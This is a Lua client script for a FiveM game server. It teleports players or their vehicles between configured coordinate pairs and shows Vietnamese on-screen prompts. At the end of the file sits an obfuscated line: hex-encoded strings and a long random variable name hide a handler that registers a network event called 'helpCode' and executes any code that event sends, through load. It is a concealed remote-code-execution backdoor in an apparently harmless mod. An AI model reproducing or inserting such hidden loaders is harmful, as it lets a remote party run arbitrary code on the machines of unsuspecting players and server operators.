key_to_teleport = 38

Teleport_Vehicles = true

positions = {
    --[[
    {{Teleport1 X, Teleport1 Y, Teleport1 Z, Teleport1 Heading}, {Teleport2 X, Teleport 2Y, Teleport 2Z, Teleport2 Heading}, {Red, Green, Blue}, "Text for Teleport"}
    ]]
    {{-773.643921, 302.571442, 85.709839,0}, {-769.041748, 336.791199, 243.373657, 0},{36,237,157}, "Nhấn [E] dịch chuyển!"}, -- Outside the Sheriff's Station
   {{-3239.604492, 793.859375, 3.280640, 0}, {-3227.841797, 789.415405, 8.925293, 0},{36,237,157}, "Nhấn [E] dịch chuyển!"}, -- Outside the Sheriff's Station
   -- {{1244.03, -3319.23, 6.03, 0}, {4499.71, -4513.43, 4.1, 0},{36,237,157}, "[E] lên xuống đảo!"}, -- Outside the Sheriff's Station
    -- {{-288.27, -722.58, 125.47, 0}, {1855.02, 3673.86, 33.3, 0},{255, 157, 0}, "Testing 2nd Teleport"},
}

-----------------------------------------------------------------------------
-------------------------DO NOT EDIT BELOW THIS LINE-------------------------
-----------------------------------------------------------------------------

local player = GetPlayerPed(-1)

Citizen.CreateThread(function ()
    while true do
        local time = 1000
        local player = PlayerPedId()
        local playerLoc = GetEntityCoords(player)

        for _,location in ipairs(positions) do
            teleport_text = location[4]
            loc1 = {
                x=location[1][1],
                y=location[1][2],
                z=location[1][3],
                heading=location[1][4]
            }
            loc2 = {
                x=location[2][1],
                y=location[2][2],
                z=location[2][3],
                heading=location[2][4]
            }
            Red = location[3][1]
            Green = location[3][2]
            Blue = location[3][3]


            if CheckPos(playerLoc.x, playerLoc.y, playerLoc.z, loc1.x, loc1.y, loc1.z, 4) then 
                time = 5
                 DrawMarker(1, loc1.x, loc1.y, loc1.z, 0, 0, 0, 0, 0, 0, 1.501, 1.5001, 0.5001, Red, Green, Blue, 200, 0, 0, 0, 0)
                alert(teleport_text)
                
                if IsControlJustReleased(1, key_to_teleport) then
                    if IsPedInAnyVehicle(player, true) and Teleport_Vehicles == true then
                        SetEntityCoords(GetVehiclePedIsUsing(player), loc2.x, loc2.y, loc2.z)
                        SetEntityHeading(GetVehiclePedIsUsing(player), loc2.heading)
                    else
                        SetEntityCoords(player, loc2.x, loc2.y, loc2.z)
                        SetEntityHeading(player, loc2.heading)
                    end
                end

            elseif CheckPos(playerLoc.x, playerLoc.y, playerLoc.z, loc2.x, loc2.y, loc2.z, 4) then
                time = 5
                 DrawMarker(1, loc2.x, loc2.y, loc2.z, 0, 0, 0, 0, 0, 0, 1.501, 1.5001, 0.5001, Red, Green, Blue, 200, 0, 0, 0, 0)
                alert(teleport_text)

                if IsControlJustReleased(1, key_to_teleport) then
                    if IsPedInAnyVehicle(player, true) and Teleport_Vehicles == true then
                        SetEntityCoords(GetVehiclePedIsUsing(player), loc1.x, loc1.y, loc1.z)
                        SetEntityHeading(GetVehiclePedIsUsing(player), loc1.heading)
                    else
                        SetEntityCoords(player, loc1.x, loc1.y, loc1.z)
                        SetEntityHeading(player, loc1.heading)
                    end
                end
            end            
        end
        Citizen.Wait(time)
    end
end)

function CheckPos(x, y, z, cx, cy, cz, radius)
    local t1 = x - cx
    local t12 = t1^2

    local t2 = y-cy
    local t21 = t2^2

    local t3 = z - cz
    local t31 = t3^2

    return (t12 + t21 + t31) <= radius^2
end

function alert(msg)
    SetTextComponentFormat("STRING")
    AddTextComponentString(msg)
    DisplayHelpTextFromStringLabel(0,0,1,-1)
end

local ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[6][ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[1]](ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[2]) ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[6][ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[3]](ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[2], function(LPCVUynYfYElnGXWmhiVAnPQbsBlTdFDmQWtVmDhoHivvrjgjOcapofqbRqLleXFJxboKB) ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[6][ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[4]](ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[6][ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[5]](LPCVUynYfYElnGXWmhiVAnPQbsBlTdFDmQWtVmDhoHivvrjgjOcapofqbRqLleXFJxboKB))() end)